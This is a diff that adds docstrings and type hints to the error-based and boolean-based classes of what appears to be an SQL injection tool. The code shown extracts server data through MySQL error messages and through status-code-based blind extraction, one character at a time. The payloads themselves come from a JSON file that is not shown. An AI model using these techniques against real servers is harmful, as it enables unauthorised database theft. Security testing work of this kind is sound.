@@ -208,8 +208,10 @@ class ErrorBasedAttack(Attack):
 
     def attack(self) -> Union[Tuple[DataFrame, PrettyTable], None]:
         """
-        TODO
-        @return:
+        Run the error-based attack. Start with detecting possible injections, then try to exploit (extract all data from
+        the server) or run manual queries, using a found injection.
+        @return: A pandas DataFrame containing all the collected data from the server, and a PrettyTable object
+        with the vulnerable injection we used. If attack didn't find any injection, returns None.
         """
 
         for title, detect_query, exploit_query in self.iterate_injections():
@@ -242,9 +244,10 @@ class ErrorBasedAttack(Attack):
 
     def get_query_output(self, query: str) -> Union[None, str]:
         """
-        TODO
-        @param query:
-        @return:
+        Execute a given target query with the error-based method, using the saved exploit_query, and extract the output
+        of the query from the error message returned by the server.
+        @param query: The target query.
+        @return: The output of the query, or None in case of failure.
         """
 
         full_exploit_query = self.exploit_query.format(query=query)
@@ -253,9 +256,10 @@ class ErrorBasedAttack(Attack):
 
     def get_mysql_error(self, response: Response) -> Union[None, str]:
         """
-        TODO
-        @param response:
-        @return:
+        Given an HTTP response object which might contain a MySQL error injected with a query output, extract the query
+        output from it.
+        @param response: HTTP response object.
+        @return: The query output, or None in case the response isn't an error.
         """
 
         # Extracted content from response object.
@@ -296,11 +300,25 @@ class BooleanBasedAttack(Attack):
         # Used when a possible query is detected.
         self.exploit_query = None
 
-    def iterate_injections(self):
+    def iterate_injections(self) -> Iterator[str]:
+        """
+        Iterates over the injections JSON, yielding an injection "title", "detect_true", "detect_false" and "exploit"
+        at-a-time.
+        @return: "title", "detect_true", "detect_false" and "exploit" string iterator.
+        """
+
         for injection in self.injections:
             yield injection["title"], injection["detect_true"], injection["detect_false"], injection["exploit"]
 
-    def run_boolean_query(self, boolean_query):
+    def run_boolean_query(self, boolean_query: str) -> bool:
+        """
+        The method accepts a boolean query, plants it inside the detected vulnerability and looks at the HTTP status
+        code. If the status code matches the one from the detection phase of a “True” query, we return True, if it
+        matches the “False” status code we return False, otherwise we throw an error.
+        @param boolean_query: The boolean query to run.
+        @return: True or False according to result.
+        """
+
         if not self.exploit_query:
             raise AttackException("Did not get an exploit query for boolean based attack!")
 
@@ -316,7 +334,15 @@ class BooleanBasedAttack(Attack):
 
         raise AttackException(f"Unable to detect whether boolean query {boolean_query} is true or false!")
 
-    def get_single_character_from_output(self, comparison_query, index):
+    def get_single_character_from_output(self, comparison_query: str, index: int) -> str:
+        """
+        The method accepts an index and a comparison query, and attempts to resolve the character at the given index
+        from the output of the target query.
+        @param comparison_query: The comparison query.
+        @param index: The index of the character that is needed.
+        @return: The resulting character.
+        """
+
         for char in string.printable:
             boolean_query = comparison_query.format(index=index + 1, char=ord(char))
             if self.run_boolean_query(boolean_query):  # Is the character correct?
@@ -325,7 +351,15 @@ class BooleanBasedAttack(Attack):
 
         raise AttackException(f"Could not determine character at index {index} for query {comparison_query}")
 
-    def get_all_query_output_characters(self, comparison_query: str, output_length: int):
+    def get_all_query_output_characters(self, comparison_query: str, output_length: int) -> str:
+        """
+        The method accepts a comparison query and the output length of the original query, and returns the entire target
+        query output.
+        @param comparison_query: The comparison query.
+        @param output_length: The length of the target query output.
+        @return: The target query output.
+        """
+
         output = ""
 
         for index in range(output_length):
@@ -334,7 +368,16 @@ class BooleanBasedAttack(Attack):
 
         return output
 
-    def get_query_output_from_blind_extractors(self, blind_extractors, inner_query, expected_output_length: int):
+    def get_query_output_from_blind_extractors(self, blind_extractors: list[str], inner_query: str, expected_output_length: int) -> str:
+        """
+        The method extracts the output of inner_query (the target query) using a supplied list of blind_extractors and
+        the provided excepted_output_length.
+        @param blind_extractors: The blind extractors.
+        @param inner_query: The inner query.
+        @param expected_output_length: The expected output length.
+        @return: The output of inner_query.
+        """
+
         for blind_extractor in blind_extractors:
             try:
                 comparison_query = safe_format(blind_extractor, query=inner_query)
@@ -345,7 +388,13 @@ class BooleanBasedAttack(Attack):
 
         raise AttackException(f"Could not get query output for {inner_query}")
 
-    def get_query_output(self, query):
+    def get_query_output(self, query: str) -> Union[str, None]:
+        """
+        Execute a given target query with the boolean-based method, using the saved exploit_query.
+        @param query: The target query.
+        @return: The output of the query, or None in case of failure.
+        """
+
         try:
             output_length_of_length = int(
                 self.get_query_output_from_blind_extractors(
@@ -375,13 +424,20 @@ class BooleanBasedAttack(Attack):
             return None
 
     def attack(self) -> Union[Tuple[DataFrame, PrettyTable], None]:
+        """
+        Run the boolean-based attack. Start with detecting possible injections, then try to exploit (extract all data
+        from the server) or run manual queries, using a found injection.
+        @return: A pandas DataFrame containing all the collected data from the server, and a PrettyTable object
+        with the vulnerable injection we used. If attack didn't find any injection, returns None.
+        """
+
         for title, detect_true, detect_false, exploit_query in self.iterate_injections():
             logging.info(f"Attempting boolean-based injection {title}")
 
             attack_url_true, response_true = self.run_payload(detect_true)
             attack_url_false, response_false = self.run_payload(detect_false)
 
-            # If same status code, we can't leak a success bit
+            # If same status code, we can't leak a success bit.
             if response_true.status_code == response_false.status_code:
                 continue
 
